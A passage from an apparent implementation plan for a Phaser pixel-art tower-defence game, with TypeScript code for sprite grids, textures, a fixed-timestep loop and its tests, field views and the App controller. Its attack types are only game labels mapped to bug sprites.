    return outline(g);
  },
  hammer: (): Grid => outline(draw(grid(16, 14), [[1, 2, 'lllllllll'], [2, 2, 'wlmmmmmmd'], [3, 2, 'lmmmmmmmd'], [4, 2, 'dddddddddd'], [5, 6, 'T'], [6, 6, 'T'], [7, 6, 'TT'], [8, 7, 'T'], [9, 7, 'T'], [10, 7, 'TT'], [11, 8, 'T'], [12, 8, 't']])),
  tar: (): Grid => outline(draw(grid(16, 14), [[5, 4, 'C..C'], [6, 3, 'CkkC'], [8, 2, 'kkkkkkkkk'], [9, 1, 'kkkCkkkkkkkk'], [10, 1, 'kkkkkkkCkkkkk'], [11, 2, 'kkkkkkkkkkk'], [7, 9, 'C'], [6, 10, 'CC']])),
  lens: (): Grid => outline(draw(grid(16, 14), [[1, 3, 'llll'], [2, 2, 'lBBjjl'], [3, 1, 'lBBBjjl'], [4, 1, 'lBBBBjl'], [5, 1, 'lBBBBBl'], [6, 2, 'lBBBl'], [7, 3, 'lll'], [7, 7, 'T'], [8, 8, 'TT'], [9, 9, 'TT'], [10, 10, 'TT'], [11, 11, 'tt']])),
  shield: (): Grid => outline(draw(grid(16, 14), [[1, 3, 'lllllllll'], [2, 3, 'lBBBBBBBb'], [3, 3, 'lBBBBBBwb'], [4, 3, 'lBBBBBwBb'], [5, 3, 'lBwBBwBBb'], [6, 3, 'lBBwwBBBb'], [7, 4, 'lBBwBBb'], [8, 4, 'lBBBBBb'], [9, 5, 'lBBBb'], [10, 6, 'lBb'], [11, 7, 'b']])),
  tape: (): Grid => outline(draw(grid(16, 14), [[2, 1, 'kkkkkkkkkkkkk'], [3, 1, 'kllkkkkkkllkk'], [4, 1, 'klwlkkkklwlkk'], [5, 1, 'kllkkkkkkllkk'], [6, 1, 'kkkkkkkkkkkkk'], [7, 1, 'kkkTTTTTTTkkk'], [8, 1, 'kkkkkkkkkkkkk']])),
  eye: (): Grid => outline(draw(grid(16, 14), [[4, 4, 'wwwwwwww'], [5, 2, 'wwwbBBBbwwww'], [6, 1, 'wwwbBkkBbwwww'], [7, 1, 'wwwbBkkBbwwww'], [8, 2, 'wwwbBBBbwwww'], [9, 4, 'wwwwwwww'], [2, 6, 'R'], [1, 9, 'R'], [11, 12, 'r'], [12, 11, 'rr']])),
  lock: (): Grid => outline(draw(grid(16, 14), [[1, 5, 'llllll'], [2, 4, 'l'], [2, 11, 'l'], [3, 4, 'l'], [3, 11, 'l'], [4, 4, 'l'], [4, 11, 'l'],
    [5, 2, 'RRRRRRRRRRRR'], [6, 2, 'RRRRRRRRRRRR'], [7, 2, 'RRRRRkkRRRRR'], [8, 2, 'RRRRRkkRRRRR'], [9, 2, 'RRRRRRkRRRRR'], [10, 2, 'rRRRRRRRRRRr'], [11, 2, 'rrrrrrrrrrrr']])),
  cloud: (): Grid => outline(draw(grid(16, 14), [[3, 5, 'iiii'], [4, 3, 'iiiiiiii'], [4, 11, 'ii'], [5, 2, 'iiiiiiiiiiii'], [6, 1, 'iiiiiiiiiiiiii'], [7, 1, 'jjjjjjjjjjjjjj'], [8, 2, 'jjjjjjjjjjjj'], [10, 4, 'B'], [10, 8, 'B'], [10, 12, 'B'], [11, 3, 'B'], [11, 7, 'B'], [11, 11, 'B']])),
  lockShut: (): Grid => outline(draw(grid(10, 10), [[1, 3, 'llll'], [2, 2, 'l'], [2, 7, 'l'], [3, 2, 'l'], [3, 7, 'l'], [4, 1, 'RRRRRRRR'], [5, 1, 'RRRkkRRR'], [6, 1, 'RRRkkRRR'], [7, 1, 'rRRRRRRr'], [8, 1, 'rrrrrrrr']])),
  lockOpen: (): Grid => outline(draw(grid(10, 10), [[0, 3, 'llll'], [1, 2, 'l'], [1, 7, 'l'], [2, 2, 'l'], [4, 1, 'BBBBBBBB'], [5, 1, 'BBBkkBBB'], [6, 1, 'BBBkkBBB'], [7, 1, 'bBBBBBBb'], [8, 1, 'bbbbbbbb']])),
};

export type BugKind = 'spider' | 'worm' | 'beetle' | 'fly' | 'gnat';
export const BUG_OF: Record<MaliciousKind, BugKind> = { sqli: 'spider', xss: 'worm', brute: 'beetle', scan: 'fly', flood: 'gnat' };

const legLines = (g: Grid, attach: [number, number][], ends: [number, number][], c: string): void =>
  attach.forEach(([ax, ay], i) => line(g, ax, ay, ends[i][0], ends[i][1], c));
const mirror = (pts: [number, number][], w: number): [number, number][] => pts.map(([x, y]) => [w - x, y]);

export const critter = (kind: BugKind, f: 0 | 1): Grid => {
  if (kind === 'spider') {
    const g = grid(17, 13);
    const A: [number, number][] = [[3, 1], [1, 4], [1, 8], [3, 11]], B: [number, number][] = [[2, 0], [0, 3], [0, 7], [2, 10]];
    const at: [number, number][] = [[5, 4], [5, 5], [5, 7], [5, 8]];
    legLines(g, at, f ? B : A, 'r'); legLines(g, mirror(at, 16), mirror(f ? A : B, 16), 'r');
    draw(g, [[2, 7, 'RRR'], [3, 6, 'RwRwR'], [4, 6, 'RRRRR'], [5, 5, 'RRRRRRR'], [6, 5, 'RRrRrRR'], [7, 5, 'RRRRRRR'], [8, 5, 'RRrRrRR'], [9, 6, 'RRRRR'], [10, 7, 'RRR']]);
    return outline(g);
  }
  if (kind === 'beetle') {
    const g = grid(15, 14);
    const A: [number, number][] = [[1, 2], [0, 6], [1, 11]], B: [number, number][] = [[0, 3], [1, 7], [2, 12]];
    const at: [number, number][] = [[4, 4], [4, 6], [4, 9]];
    legLines(g, at, f ? B : A, 'G'); legLines(g, mirror(at, 14), mirror(f ? A : B, 14), 'G');
    line(g, 6, 2, 5, 0, 'G'); line(g, 8, 2, 9, 0, 'G');
    draw(g, [[2, 6, 'GGG'], [3, 5, 'ggGgg'], [4, 4, 'gwgGggg'], [5, 4, 'gwgGggg'], [6, 4, 'gggGggg'], [7, 4, 'gggGggg'], [8, 4, 'gggGggg'], [9, 4, 'gggGggg'], [10, 5, 'ggGgg'], [11, 6, 'ggg']]);
    return outline(g);
  }
  if (kind === 'fly') {
    const g = grid(15, 12);
    if (f) { poly(g, [[6, 4], [1, 1], [0, 4], [5, 6]], 'j'); poly(g, [[9, 4], [14, 1], [15, 4], [10, 6]], 'j'); }
    else { poly(g, [[6, 5], [2, 7], [1, 10], [6, 8]], 'j'); poly(g, [[9, 5], [13, 7], [14, 10], [9, 8]], 'j'); }
    draw(g, [[2, 6, 'RmR'], [3, 6, 'mmm'], [4, 6, 'mdm'], [5, 6, 'mdm'], [6, 6, 'mdm'], [7, 6, 'mdm'], [8, 7, 'm']]);
    return outline(g);
  }
  if (kind === 'gnat') {
    const g = grid(9, 8);
    draw(g, f ? [[1, 1, 'jj'], [1, 6, 'jj'], [2, 2, 'j'], [2, 6, 'j']] : [[5, 1, 'jj'], [5, 6, 'jj'], [4, 2, 'j'], [4, 6, 'j']]);
    draw(g, [[2, 4, 'R'], [3, 3, 'mmm'], [4, 3, 'mdm'], [5, 4, 'm']]);
    return outline(g);
  }
  const g = grid(19, 8);
  for (let i = 0; i < 7; i++) {
    const x = 1 + i * 2, y = 3 + Math.round(Math.sin(i * 0.9 + (f ? Math.PI : 0)) * 1.4);
    rect(g, x, y, 2, 2, i % 2 ? 'y' : 'T');
    if (i === 6) { rect(g, x + 2, y, 2, 2, 'y'); g[y][x + 3] = 'k'; }
  }
  return outline(g);
};

export const iconGrid = (icon: IconId): Grid =>
  icon === 'horse' ? knightHorse(0, false) : icon === 'squire' ? knightFoot(false) : ICONS[icon]();

const BUGS: BugKind[] = ['spider', 'worm', 'beetle', 'fly', 'gnat'];

export const SPRITE_DEFS: { key: string; grid: () => Grid; scale: number }[] = [
  { key: 'knight-foot-idle', grid: () => knightFoot(false), scale: 3 },
  { key: 'knight-foot-throw', grid: () => knightFoot(true), scale: 3 },
  { key: 'knight-horse-0', grid: () => knightHorse(0, false), scale: 3 },
  { key: 'knight-horse-1', grid: () => knightHorse(1, false), scale: 3 },
  { key: 'knight-horse-throw', grid: () => knightHorse(0, true), scale: 3 },
  { key: 'squire-idle', grid: () => knightFoot(false), scale: 2 },
  { key: 'squire-throw', grid: () => knightFoot(true), scale: 2 },
  { key: 'spear', grid: spear, scale: 3 },
  { key: 'spear-small', grid: spear, scale: 2 },
  { key: 'hammer', grid: ICONS.hammer, scale: 3 },
  { key: 'lock-shut', grid: ICONS.lockShut, scale: 2 },
  { key: 'lock-open', grid: ICONS.lockOpen, scale: 2 },
  ...BUGS.flatMap((b) => ([0, 1] as const).map((f) => ({ key: `bug-${b}-${f}`, grid: () => critter(b, f), scale: 2 }))),
];
```

The rack texture is not in `SPRITE_DEFS` because its LEDs and size come from `rackSprite(RACK.rows)`; `registerTextures` adds it explicitly under the key `rack`.

- [ ] **Step 4: Implement `src/art/textures.ts` and `src/art/dataurl.ts`**

`src/art/textures.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import { RACK } from '../core/constants';

// local
import { paintGrid, type Grid } from './pixels';
import { rackSprite, SPRITE_DEFS } from './sprites';

const addGrid = (scene: Phaser.Scene, key: string, g: Grid, scale: number): void => {
  if (scene.textures.exists(key)) return;
  const tex = scene.textures.createCanvas(key, g[0].length * scale, g.length * scale);
  if (!tex) return;
  paintGrid(tex.getContext(), g, scale);
  tex.refresh();
  tex.setFilter(Phaser.Textures.FilterMode.NEAREST);
};

// Pixel sprites are drawn at their logical size; the 2x camera upsamples them with NEAREST.
export const registerTextures = (scene: Phaser.Scene): void => {
  for (const d of SPRITE_DEFS) addGrid(scene, d.key, d.grid(), d.scale);
  addGrid(scene, 'rack', rackSprite(RACK.rows).grid, 3);
};
```

`src/art/dataurl.ts`:
```ts
// core
import type { IconId } from '../core/content/cards';

// local
import { paintGrid, type Grid } from './pixels';
import { iconGrid } from './sprites';

const cache = new Map<string, string>();

export const gridUrl = (g: Grid, scale: number): string => {
  const c = document.createElement('canvas');
  c.width = g[0].length * scale;
  c.height = g.length * scale;
  const ctx = c.getContext('2d');
  if (ctx) paintGrid(ctx, g, scale);
  return c.toDataURL('image/png');
};

// Tiles sit in the 44px loadout column; cards show a bigger icon. Actors use a smaller scale.
export const iconUrl = (icon: IconId, size: 'tile' | 'card'): string => {
  const key = `${icon}:${size}`;
  const hit = cache.get(key);
  if (hit) return hit;
  const actor = icon === 'horse' || icon === 'squire';
  const url = gridUrl(iconGrid(icon), size === 'tile' ? (actor ? 1 : 2) : (actor ? 2 : 4));
  cache.set(key, url);
  return url;
};
```

Run: `npx vitest run src/art && npm run build` → PASS (tests green, build compiles `textures.ts` against Phaser 4 types).

- [ ] **Step 5: Commit**

```bash
git add src/art
git commit -m "Port the pixel art from the mock into typed sprite data" -m "Sprites stay as hand-tunable grids that become textures at boot, so polishing the art later never touches the pipeline; the cloud icon and gnat bug are new for the flood wave." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 13: The scene, the App loop and the field's static views

**Files:**
- Create: `src/core/loop.ts`, `src/game/view.ts`, `src/game/views/lanes.ts`, `src/game/views/fireWall.ts`, `src/game/views/rack.ts`, `src/game/views/actors.ts`, `src/app.ts`
- Modify: `src/game/FieldScene.ts` (replace whole file), `src/main.ts` (replace the `boot` function), `scripts/smoke.mjs` (add the `loop` check)
- Test: `src/core/loop.test.ts`

**Interfaces:**
- Consumes: `Run`, `RunEvent`, `STEP`, `MAX_STEPS_PER_FRAME`, geometry constants, `HEX`, `registerTextures`, `rackSprite`, `routeKey`, `Screen`, `Action`, `createStore`/`Store`, `t`, `onLang`.
- Produces:
  - `loop.ts`: `frameSteps(acc: number, deltaMs: number): { steps: number; acc: number }`.
  - `view.ts`: `interface View { start?(run: Run): void; event?(ev: RunEvent, run: Run): void; frame?(run: Run | null, dt: number, time: number): void; pause?(paused: boolean): void; screen?(s: Screen): void; refresh?(run: Run | null): void }`.
  - `FieldScene`: `layers: { back; packets; objects; actors; fx }` (Containers at `(0, FIELD_TOP)`, all field coordinates are local to them).
  - `App`: `run`, `screen`, `root`, `store`, `add(...views)`, `startRun(mode)`, `dispatch(evs)`, `act(action)`, `setScreen(screen)`, `refresh()`, `onScreen: ((s: Screen) => void) | null`, `onEnd: ((run: Run) => void) | null`. Later tasks call these; `refresh()` re-renders every view after hints, language or effects settings change.
  - `window.__nsp = { game, app }` for smoke checks.

- [ ] **Step 1: Write the failing loop test**

`src/core/loop.test.ts`:
```ts
// packages
import { describe, expect, it } from 'vitest';

// core
import { MAX_STEPS_PER_FRAME, STEP } from './constants';
import { frameSteps } from './loop';

describe('frameSteps', () => {
  it('runs one fixed step per 60 Hz frame', () => {
    const r = frameSteps(0, 1000 / 60);
    expect(r.steps).toBe(1);
    expect(r.acc).toBeCloseTo(0, 6);
  });
  it('accumulates short frames', () => {
    const a = frameSteps(0, 8);
    expect(a.steps).toBe(0);
    const b = frameSteps(a.acc, 9);
    expect(b.steps).toBe(1);
    expect(b.acc).toBeCloseTo(0.017 - STEP, 6);
  });
  it('drops the backlog after a long pause instead of fast-forwarding', () => {
    const r = frameSteps(0, 10_000);
    expect(r.steps).toBe(MAX_STEPS_PER_FRAME);
    expect(r.acc).toBe(0);
  });
  it('ignores negative deltas', () => {
    expect(frameSteps(0.005, -40)).toEqual({ steps: 0, acc: 0.005 });
  });
});
```

Run: `npx vitest run src/core/loop.test.ts` → FAIL.

- [ ] **Step 2: Implement `src/core/loop.ts`**

```ts
// core
import { MAX_STEPS_PER_FRAME, STEP } from './constants';

// Fixed-timestep accumulator. A tab that was hidden for minutes comes back with a
// huge delta; the backlog is dropped so the run never fast-forwards.
export const frameSteps = (acc: number, deltaMs: number): { steps: number; acc: number } => {
  let a = acc + Math.max(0, deltaMs) / 1000;
  let steps = Math.floor(a / STEP + 1e-9);
  a -= steps * STEP;
  if (steps > MAX_STEPS_PER_FRAME) { steps = MAX_STEPS_PER_FRAME; a = 0; }
  return { steps, acc: Math.max(0, a) };
};
```

Run: `npx vitest run src/core/loop.test.ts` → PASS.

- [ ] **Step 3: View contract and scene**

`src/game/view.ts`:
```ts
// core
import type { RunEvent } from '../core/events';
import type { Screen } from '../core/keys';
import type { Run } from '../core/run';

// Everything that draws (Phaser views and DOM panels) implements some of these.
// `dt` is 0 whenever the simulation is not running; `time` keeps advancing unless paused.
export interface View {
  start?(run: Run): void;
  event?(ev: RunEvent, run: Run): void;
  frame?(run: Run | null, dt: number, time: number): void;
  pause?(paused: boolean): void;
  screen?(s: Screen): void;
  refresh?(run: Run | null): void;
}
```

`src/game/FieldScene.ts` (replace the file):
```ts
// packages
import Phaser from 'phaser';

// core
import { FIELD_TOP } from '../core/constants';

// art
import { registerTextures } from '../art/textures';

// stage
import { RENDER_SCALE, SCREEN_H, SCREEN_W } from '../stage';

type Layer = Phaser.GameObjects.Container;
let resolveReady: (scene: FieldScene) => void = () => {};

export class FieldScene extends Phaser.Scene {
  static readonly ready: Promise<FieldScene> = new Promise((r) => { resolveReady = r; });
  onFrame: ((deltaMs: number) => void) | null = null;
  layers!: { back: Layer; packets: Layer; objects: Layer; actors: Layer; fx: Layer };

  constructor() {
    super('field');
  }

  create(): void {
    registerTextures(this);
    this.cameras.main.setZoom(RENDER_SCALE).centerOn(SCREEN_W / 2, SCREEN_H / 2);
    const layer = (): Layer => this.add.container(0, FIELD_TOP);
    this.layers = { back: layer(), packets: layer(), objects: layer(), actors: layer(), fx: layer() };
    resolveReady(this);
  }

  update(_time: number, deltaMs: number): void {
    this.onFrame?.(deltaMs);
  }
}
```

- [ ] **Step 4: Lanes and the wall of fire**

`src/game/views/lanes.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import { FW_X, LANE_COUNT, LANE_H, LANE_X0 } from '../../core/constants';
import { HEX } from '../../core/palette';
import type { Run } from '../../core/run';

// game
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';

export class LanesView implements View {
  private readonly highlight: Phaser.GameObjects.Rectangle;
  private readonly flows: Phaser.GameObjects.TileSprite[] = [];

  constructor(scene: FieldScene) {
    const back = scene.layers.back;
    const g = scene.add.graphics();
    g.fillStyle(HEX.mute, 1);
    for (let i = 1; i <= LANE_COUNT; i++) for (let x = LANE_X0; x < FW_X; x += 8) g.fillRect(x, i * LANE_H - 1, 4, 1);
    back.add(g);
    this.highlight = scene.add.rectangle(LANE_X0, 0, FW_X - LANE_X0, LANE_H, HEX.ink, 0.045).setOrigin(0, 0);
    back.add(this.highlight);
    if (!scene.textures.exists('flow')) {
      const tex = scene.textures.createCanvas('flow', 30, 2);
      if (tex) { const c = tex.getContext(); c.fillStyle = '#44464d'; c.fillRect(0, 0, 12, 2); tex.refresh(); }
    }
    for (let i = 0; i < LANE_COUNT; i++) {
      const ts = scene.add.tileSprite(LANE_X0, i * LANE_H + 44, FW_X - LANE_X0, 2, 'flow').setOrigin(0, 0).setAlpha(0.5);
      back.add(ts);
      this.flows.push(ts);
    }
  }

  frame(run: Run | null, dt: number): void {
    for (const f of this.flows) f.tilePositionX -= 18.75 * dt;
    this.highlight.y = (run?.state.knight.lane ?? 2) * LANE_H;
  }
}
```

`src/game/views/fireWall.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import { FIELD_H, FW_X } from '../../core/constants';
import type { RunEvent } from '../../core/events';
import { HEX } from '../../core/palette';

// game
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';

const W = 8, H = 150;
export type FirePalette = [number, number, number, number][];
export const FIRE_BLUE: FirePalette = [[22, 96, 143, 190], [47, 182, 255, 230], [143, 220, 255, 245], [232, 248, 255, 255]];

// A column of animated pixel fire: the firewall, literally.
export class FireWallView implements View {
  private readonly tex: Phaser.Textures.CanvasTexture;
  private readonly data: ImageData;
  private readonly flash: Phaser.GameObjects.Rectangle;
  palette: FirePalette = FIRE_BLUE;

  constructor(private readonly scene: FieldScene) {
    this.tex = scene.textures.createCanvas('firewall', W, H)!;
    this.tex.setFilter(Phaser.Textures.FilterMode.NEAREST);
    this.data = this.tex.getContext().createImageData(W, H);
    scene.layers.objects.add(scene.add.image(FW_X, 0, 'firewall').setOrigin(0, 0).setScale(3).setAlpha(0.92));
    this.flash = scene.add.rectangle(FW_X, 0, 24, FIELD_H, HEX.blue, 0).setOrigin(0, 0);
    scene.layers.objects.add(this.flash);
  }

  frame(_run: unknown, _dt: number, time: number): void {
    const d = this.data.data;
    for (let y = 0; y < H; y++) for (let x = 0; x < W; x++) {
      const c = 1 - Math.abs(x - 3.5) / 4.3;
      const v = (Math.sin(y * 0.55 + time * 7 + x * 0.9) + Math.sin(y * 0.23 + time * 4.1 - x * 1.9) + Math.sin(y * 1.17 + time * 11.3 + x)) / 3;
      const k = c * 0.95 + v * 0.45 - 0.12;
      const idx = k > 0.92 ? 3 : k > 0.68 ? 2 : k > 0.42 ? 1 : k > 0.2 ? 0 : -1;
      const o = (y * W + x) * 4;
      if (idx < 0) { d[o + 3] = 0; continue; }
      const col = this.palette[idx];
      d[o] = col[0]; d[o + 1] = col[1]; d[o + 2] = col[2]; d[o + 3] = col[3];
    }
    this.tex.getContext().putImageData(this.data, 0, 0);
    this.tex.refresh();
  }

  event(ev: RunEvent): void {
    if (ev.type === 'shattered' && ev.by === 'rule' && ev.ruleId !== 'lockdown') {
      this.flash.setAlpha(0.6);
      this.scene.tweens.add({ targets: this.flash, alpha: 0, duration: 140 });
    }
  }
}
```

- [ ] **Step 5: The rack and its fire**

`src/game/views/rack.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import { RACK } from '../../core/constants';
import type { RunEvent } from '../../core/events';
import type { Run } from '../../core/run';
import type { MaliciousKind } from '../../core/types';

// art
import { BUG_OF, rackSprite } from '../../art/sprites';

// game
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';

const FW = 40, FH = RACK.rows + 2, MAX = 13;
const FIRE: (number[] | null)[] = [null, [40, 10, 6, 70], [60, 16, 7, 110], [80, 22, 7, 150], [100, 30, 7, 180], [120, 38, 7, 200], [143, 47, 7, 220],
  [170, 60, 7, 235], [199, 76, 7, 245], [223, 90, 7, 250], [235, 115, 15, 255], [228, 160, 31, 255], [242, 196, 75, 255], [255, 236, 170, 255]];

// The server: a full-height pixel rack that burns floor by floor as uptime drops.
export class RackView implements View {
  private readonly box: Phaser.GameObjects.Container;
  private readonly rack: Phaser.GameObjects.Image;
  private readonly leds: { r: Phaser.GameObjects.Rectangle; color: number; phase: number }[] = [];
  private readonly fireTex: Phaser.Textures.CanvasTexture;
  private readonly fireData: ImageData;
  private readonly cells = new Uint8Array(FW * FH);
  private readonly floors: number[];
  private readonly bugs: { s: Phaser.GameObjects.Sprite; kind: string; x: number; y: number; phase: number }[] = [];
  private acc = 0;
  private uptime = 100;
  private flashing = false;
  private paused = false;

  constructor(private readonly scene: FieldScene) {
    this.box = scene.add.container(RACK.x, RACK.y);
    scene.layers.actors.add(this.box);
    this.rack = scene.add.image(0, 0, 'rack').setOrigin(0, 0);
    this.box.add(this.rack);
    const sprite = rackSprite(RACK.rows);
    sprite.leds.forEach(([x, y, c], i) => {
      const color = c === 'green' ? 0x3ddc84 : 0x2fb6ff;
      const r = scene.add.rectangle(x * 3, y * 3, 3, 3, color).setOrigin(0, 0);
      this.box.add(r);
      this.leds.push({ r, color, phase: (i * 0.37) % 1.3 });
    });
    this.floors = [RACK.rows - 4, ...sprite.units.map((y) => y + 6).reverse()];
    this.fireTex = scene.textures.createCanvas('rackfire', FW, FH)!;
    this.fireTex.setFilter(Phaser.Textures.FilterMode.NEAREST);
    this.fireData = this.fireTex.getContext().createImageData(FW, FH);
    this.box.add(scene.add.image(0, 0, 'rackfire').setOrigin(0, 0).setScale(3));
  }

  pause(p: boolean): void {
    this.paused = p;
  }

  start(): void {
    this.cells.fill(0);
    this.uptime = 100;
    this.clearBugs();
  }

  private clearBugs(): void {
    for (const b of this.bugs) b.s.destroy();
    this.bugs.length = 0;
  }

  event(ev: RunEvent): void {
    if (ev.type === 'uptime') this.uptime = ev.after;
    if (ev.type === 'waveStarted') this.clearBugs();
    if (ev.type === 'resolved' && ev.outcome === 'breach') {
      this.tint(0xff7070);
      this.scene.tweens.add({ targets: this.box, x: { from: RACK.x - 5, to: RACK.x }, duration: 300, ease: 'Bounce.easeOut' });
      this.infest(ev.packet.t.kind as MaliciousKind);
    }
    if (ev.type === 'resolved' && ev.outcome === 'neutralized') this.tint(0x9fdcff);
  }

  // A breach or a neutralization flashes the rack; the char tint resumes afterwards.
  private tint(color: number): void {
    this.flashing = true;
    this.rack.setTint(color);
    this.scene.time.delayedCall(320, () => { this.flashing = false; });
  }

  private infest(kind: MaliciousKind): void {
    if (this.bugs.length >= 6) this.bugs.shift()!.s.destroy();
    const bug = BUG_OF[kind];
    const s = this.scene.add.sprite(0, 0, `bug-${bug}-0`);
    this.box.add(s);
    this.bugs.push({ s, kind: bug, x: 20 + Math.random() * 80, y: 40 + Math.random() * 360, phase: Math.random() * Math.PI * 2 });
  }

  frame(_run: Run | null, dt: number, time: number): void {
    if (this.paused) return;
    const low = this.uptime < 35;
    for (const l of this.leds) {
      const on = Math.floor((time + l.phase) / (low ? 0.2 : 0.55)) % 2 === 0;
      l.r.setFillStyle(low ? 0xff2f2f : l.color, on ? 1 : 0.2);
    }
    for (const b of this.bugs) {
      const a = time * 1.6 + b.phase;
      b.s.setPosition(b.x + Math.cos(a) * 14, b.y + Math.sin(a * 1.3) * 22).setRotation(a);
      b.s.setTexture(`bug-${b.kind}-${Math.floor(time / 0.12) % 2}`);
    }
    this.acc += dt;
    if (this.acc >= 1 / 30 || dt === 0) { this.acc = 0; this.stepFire(); }
  }

  private stepFire(): void {
    const c = this.cells, dmg = 1 - this.uptime / 100;
    const decayMax = dmg < 0.25 ? 3 : dmg < 0.6 ? 2 : 1;
    for (let x = 0; x < FW; x++) for (let y = 1; y < FH; y++) {
      const src = y * FW + x, v = c[src];
      if (!v) { c[src - FW] = 0; continue; }
      const r = Math.floor(Math.random() * 3);
      const dst = Math.max(FW, Math.min(FW * FH - 1, src - r + 1));
      c[dst - FW] = Math.max(0, v - Math.floor(Math.random() * (decayMax + 1)));
    }
    for (let x = 0; x < FW; x++) c[(FH - 1) * FW + x] = 0;
    if (dmg >= 0.08) {
      const floors = Math.min(this.floors.length, 1 + Math.floor(((dmg - 0.08) / 0.92) * this.floors.length));
      const w = Math.round(10 + dmg * 28), x0 = Math.round((FW - w) / 2);
      for (let i = 0; i < floors; i++) {
        const row = this.floors[i];
        for (let x = x0 + ((i * 7) % 9) - 4; x < x0 + w + ((i * 5) % 7) - 3; x++) if (x >= 0 && x < FW && Math.random() < 0.75) c[row * FW + x] = MAX - (i % 2);
      }
    }
    const d = this.fireData.data;
    for (let i = 0; i < c.length; i++) {
      const col = FIRE[c[i]], o = i * 4;
      if (col) { d[o] = col[0]; d[o + 1] = col[1]; d[o + 2] = col[2]; d[o + 3] = col[3]; } else d[o + 3] = 0;
    }
    this.fireTex.getContext().putImageData(this.fireData, 0, 0);
    this.fireTex.refresh();
    if (!this.flashing) {
      const v = Math.round(255 * (1 - dmg * 0.5));
      this.rack.setTint(Phaser.Display.Color.GetColor(v, Math.round(v * 0.95), Math.round(v * 0.9)));
    }
  }
}
```

- [ ] **Step 6: The knight and the Squire**

`src/game/views/actors.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import { KN_X, SQUIRE_POS } from '../../core/constants';
import { CSS } from '../../core/palette';
import type { Run } from '../../core/run';
import { knightY, mounted } from '../../core/state';

// i18n
import { t } from '../../i18n';

// stage
import { RENDER_SCALE } from '../../stage';

// game
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';

const label = (scene: FieldScene, text: string, bg: string): Phaser.GameObjects.Text =>
  scene.add.text(0, 0, text, { fontFamily: 'Space Mono', fontSize: '13px', fontStyle: '700', color: CSS.paper, backgroundColor: bg, padding: { x: 5, y: 0 }, resolution: RENDER_SCALE }).setOrigin(0.5, 0);

export class ActorsView implements View {
  private readonly knight: Phaser.GameObjects.Image;
  private readonly you: Phaser.GameObjects.Text;
  private readonly squire: Phaser.GameObjects.Image;
  private readonly squireLabel: Phaser.GameObjects.Text;

  constructor(scene: FieldScene) {
    const layer = scene.layers.actors;
    this.knight = scene.add.image(KN_X, knightY(2, false), 'knight-foot-idle').setOrigin(0, 0);
    this.you = label(scene, t('actor.you'), CSS.ink);
    this.squire = scene.add.image(SQUIRE_POS.x, SQUIRE_POS.y, 'squire-idle').setOrigin(0, 0).setVisible(false);
    this.squireLabel = label(scene, t('actor.squire'), CSS.gold).setVisible(false);
    layer.add([this.squire, this.squireLabel, this.knight, this.you]);
  }

  refresh(): void {
    this.you.setText(t('actor.you'));
    this.squireLabel.setText(t('actor.squire'));
  }

  frame(run: Run | null, _dt: number, time: number): void {
    const s = run?.state;
    const k = s?.knight ?? { x: KN_X, y: knightY(2, false), moving: false, throwT: 0, facing: 'left' as const };
    const horse = s ? mounted(s) : false;
    const key = horse
      ? k.throwT > 0 ? 'knight-horse-throw' : k.moving ? `knight-horse-${Math.floor(time / 0.11) % 2}` : 'knight-horse-0'
      : k.throwT > 0 ? 'knight-foot-throw' : 'knight-foot-idle';
    const bob = !k.moving && k.throwT === 0 && Math.floor(time / 0.5) % 2 ? -3 : 0;
    this.knight.setTexture(key).setPosition(k.x, k.y + bob).setFlipX(k.moving && k.facing === 'right');
    this.you.setPosition(k.x + this.knight.displayWidth / 2, k.y + this.knight.displayHeight - 4);
    const hasSquire = !!s?.owned.includes('squire');
    this.squire.setVisible(hasSquire).setTexture(s && s.squire.throwT > 0 ? 'squire-throw' : 'squire-idle');
    this.squireLabel.setVisible(hasSquire).setPosition(SQUIRE_POS.x + 21, SQUIRE_POS.y + 56);
  }
}
```

- [ ] **Step 7: The App**

`src/app.ts`:
```ts
// core
import { STEP } from './core/constants';
import type { Mode } from './core/content/waves';
import type { RunEvent } from './core/events';
import { routeKey, type Action, type Screen } from './core/keys';
import { frameSteps } from './core/loop';
import { Run } from './core/run';

// game
import type { FieldScene } from './game/FieldScene';
import type { View } from './game/view';

// local
import type { Store } from './storage';

export class App {
  run: Run | null = null;
  screen: Screen = 'title';
  root = false;
  onScreen: ((s: Screen) => void) | null = null;
  onEnd: ((run: Run) => void) | null = null;
  private readonly views: View[] = [];
  private acc = 0;
  private time = 0;
  private beforeConsole: Screen = 'playing';

  constructor(readonly scene: FieldScene, readonly store: Store) {
    scene.onFrame = (ms) => this.frame(ms);
    window.addEventListener('keydown', (e) => this.key(e));
  }

  add(...views: View[]): void {
    this.views.push(...views);
  }

  startRun(mode: Mode): void {
    const hints = !this.root && !!this.store.prefs().hints;
    this.run = new Run({ mode, seed: (Date.now() ^ Math.floor(Math.random() * 1e9)) >>> 0, root: this.root, hints });
    this.acc = 0;
    for (const v of this.views) v.start?.(this.run);
    this.setScreen('playing');
    this.dispatch(this.run.start());
  }

  dispatch(evs: RunEvent[]): void {
    const run = this.run;
    if (!run) return;
    for (const ev of evs) {
      for (const v of this.views) v.event?.(ev, run);
      if (ev.type === 'draftOpened') this.setScreen('draft');
      if (ev.type === 'waveStarted' && this.screen === 'draft') this.setScreen('playing');
      if (ev.type === 'runEnded') setTimeout(() => { this.setScreen('debrief'); this.onEnd?.(run); }, 1200);
    }
  }

  setScreen(s: Screen): void {
    if (s === 'console') this.beforeConsole = this.screen;
    this.screen = s;
    const paused = s === 'paused' || s === 'console';
    for (const v of this.views) { v.pause?.(paused); v.screen?.(s); }
    this.onScreen?.(s);
  }

  refresh(): void {
    for (const v of this.views) v.refresh?.(this.run);
  }

  private frame(ms: number): void {
    const paused = this.screen === 'paused' || this.screen === 'console';
    const playing = this.screen === 'playing' && !!this.run && this.run.state.phase === 'playing';
    const dt = playing ? Math.min(Math.max(ms, 0), 50) / 1000 : 0;
    if (!paused) this.time += Math.min(Math.max(ms, 0), 50) / 1000;
    if (playing && this.run) {
      const r = frameSteps(this.acc, ms);
      this.acc = r.acc;
